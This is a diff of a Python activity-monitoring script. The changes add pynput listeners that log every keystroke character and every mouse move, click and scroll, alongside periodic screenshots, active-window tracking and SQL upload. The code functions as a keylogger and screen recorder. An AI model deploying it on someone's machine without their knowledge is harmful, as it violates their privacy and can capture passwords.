@@ -1,12 +1,10 @@
-# from pynput import mouse
-# from pynput import keyboard
-from pynput.keyboard import Listener  as KeyboardListener
-from pynput.mouse    import Listener  as MouseListener
-from pynput.keyboard import Key
+from pynput import mouse
+from pynput import keyboard
 import threading
 import time
 import logging
 import pyautogui
+import shutil
 import os
 import datetime
 import platform
@@ -59,18 +57,7 @@ class mouse_activities(threading.Thread):
 		self.Thread_name = name
 
 	def run(self):
-		activity()
-
-# idle_mouse class
-class class_mouse_idle(threading.Thread):
-	"""docstring for class_mouse_idle"""
-	def __init__(self, name):
-		threading.Thread.__init__(self)
-		self.Thread_name = name
-	
-	def run(self):
-		mouse_idle()	
-
+		listenmouse()
 
 # 'ubuntu screen shot' class
 class screen_shot_ub(threading.Thread):
@@ -82,7 +69,17 @@ class screen_shot_ub(threading.Thread):
 	def run(self):
 		screenshot_ub()
 
+# ' keyboard activity ' class
+class key_board(threading.Thread):
 
+	def __init__(self, name ):
+		threading.Thread.__init__(self)
+		self.Thread_name = name
+
+	def run(self):
+		keyboard_activity()
+
+# 'connection ' class
 class connection(threading.Thread):
 
 	def __init__(self, name ):
@@ -130,6 +127,7 @@ def sqlupload():
 		mydb.commit()
 
 		print(mycursor.rowcount, "record inserted.")
+		print("33333333333333333333333333333333333333333333333333333")
 		time.sleep(10.0)
 #############################################
 
@@ -194,78 +192,82 @@ def get_active_window_title():
 		time.sleep(1)
 
 #####################################################
-#######################MOUSE IDLE###############################
-mouse_movelist_x = []
-mouse_movelist_y = []
-mouse_movelist_x_prev = []
-mouse_movelist_y_prev = []
 
-def mouse_idle():
-	global mouse_movelist_x
-	global mouse_movelist_y
-	global mouse_movelist_x_prev
-	global mouse_movelist_y_prev
-	while True:
-		if mouse_movelist_x == mouse_movelist_x_prev and mouse_movelist_y == mouse_movelist_y_prev:
-			print(mouse_movelist_x_prev)
-			print(mouse_movelist_y_prev)
-			print(mouse_movelist_x)
-			print(mouse_movelist_y)
-			print("inactive")
-		else:
-			mouse_movelist_x_prev.clear()
-			mouse_movelist_y_prev.clear()
-			mouse_movelist_x_prev = list(mouse_movelist_x)
-			mouse_movelist_y_prev = list(mouse_movelist_y)
-			print("active")
-		time.sleep(10)
-
-################################################################
-
-######################## MOUSE and KEY-BOARD####################
-
+####################  MOUSE #########################
 
 def on_move(x, y):
-	global mouse_movelist_x
-	global mouse_movelist_y
-	logging.info("Mouse moved to ({0}, {1})".format(x, y))
-	if len(mouse_movelist_x)<10 and len(mouse_movelist_y)<10:
-		print(len(mouse_movelist_x))
-		mouse_movelist_x.append(x)
-		mouse_movelist_y.append(y)
+    # print('Pointer moved to {0}'.format((x, y)))
+    logging.info("[INFO]: Pointer moved to {0} ".format((x, y)))
+    
 
-	else:
-		mouse_movelist_x.pop(0)
-		mouse_movelist_x.append(x)
-		mouse_movelist_y.pop(0)
-		mouse_movelist_y.append(y)
 
-	print(mouse_movelist_x)
-
-	# print(mouse_movelist_x)
-	print(mouse_movelist_y)
-
-def on_press(key):
-	# global activities
-	key_pressed = str(key)
-	logging.info(str(key))
-	print(str(key))
-
-	# print("Mouse moved to ({0}, {1})".format(x, y))
 def on_click(x, y, button, pressed):
-	if pressed:
-		logging.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))
-		print('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))
+    # print('{0} at {1}'.format('Pressed' if pressed else 'Released',(x, y)))
+    logging.info("[INFO]: {0} at {1}".format(" Pressed" if pressed else " Released",(x, y)))
+    # if not pressed:
+    #     # Stop listener
+    #     return False
 
 def on_scroll(x, y, dx, dy):
-	logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))
-	print('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))
+    # print('Scrolled {0} at {1}'.format('down' if dy < 0 else 'up',(x, y)))
+    logging.info("[INFO]: {0} at {1}".format('down' if dy < 0 else 'up',(x, y)))
 
-def activity():
-	with MouseListener( on_click=on_click, on_scroll=on_scroll, on_move=on_move) as listener:
-		with KeyboardListener(on_press=on_press) as listener:
-			listener.join()
-############################################################################
+
+
+def listenmouse():
+
+# Collect events until released
+	with mouse.Listener(
+	        on_move=on_move,
+	        on_click=on_click,
+	        on_scroll=on_scroll) as listener:
+	    listener.join()
+
+	# ...or, in a non-blocking fashion:
+	listener = mouse.Listener(
+	    on_move=on_move,
+	    on_click=on_click,
+	    on_scroll=on_scroll)
+	listener.start()
+ ###########################################################
+
+############### keyboard activity function #################
+def on_press(key):
+	try:
+		# print('alphanumeric key {0}  pressed'.format(key.char))
+		logging.info("[INFO]: alphanumeric key {0} pressed".format(key.char))
+
+	except AttributeError:
+		# print('special key {0} pressed'.format(key))
+		logging.info("[INFO]: special key {0} pressed".format(key))
+
+
+def on_release(key):
+	# print('{0} released'.format(key))
+	logging.info("{0} released".format(key))
+
+	# if key == keyboard.Key.esc:
+	#     listener.stop
+	#     return False
+def keyboard_activity():
+
+# Collect events until released
+	with keyboard.Listener(
+		   on_press=on_press,
+		   on_release=on_release) as listener:
+		listener.join()
+  
+	# ...or, in a non-blocking fashion:
+	listener = keyboard.Listener(
+		on_press=on_press,
+		on_release=on_release)
+	listener.start()
+
+############################################################
+
+
+
+
 
 ################ ubuntu screen shot function ################
 def screenshot_ub():
@@ -287,10 +289,12 @@ def screenshot_ub():
 		print("===================")
 		image = myScreenshot.resize((width, height))
 		#   path = 'Images/'
-		img_name = 'Images/' + str(precent_time)+".png"
+		img_name = str(precent_time)+".png"
 		image.save(img_name)
 		
-
+		original = img_name
+		target = ('Images/')
+		shutil.move(original,target)
 		logging.info("[INFO]: "+str(img_name)+ " saved ")
 		######## checks no.of items in image folde ######
 		directory = 'Images'
@@ -370,24 +374,24 @@ if __name__ == '__main__':
 		# Thread to find mouse activity
 		thread_mouse = mouse_activities('mouse_activity')
 		thread_mouse.start()
-		threads.append(thread_mouse)
+		threads.append(listenmouse)
 
-		# Thread to mouse_idle
-		thread_mouse_idle = class_mouse_idle('idle_mouse')
-		thread_mouse_idle.start()
-		threads.append(thread_mouse_idle)
 
 		# thread to screen shot
 		thread_screen_shot_ub = screen_shot_ub('screen_shot')
 		thread_screen_shot_ub.start()
 		threads.append(thread_screen_shot_ub)
 
-		# thread to conectivity
+		# thread keyboard 
+		thread_keyboard = key_board('key__board')
+		thread_keyboard.start()
+		threads.append(thread_keyboard)
+
+		# thread connection
 		thread_connection = connection('conectivity')
 		thread_connection.start()
 		threads.append(thread_connection)
 
-		# thread sql
 		thread_sql = sqldata('sql')
 		thread_sql.start()
 		threads.append(thread_sql)
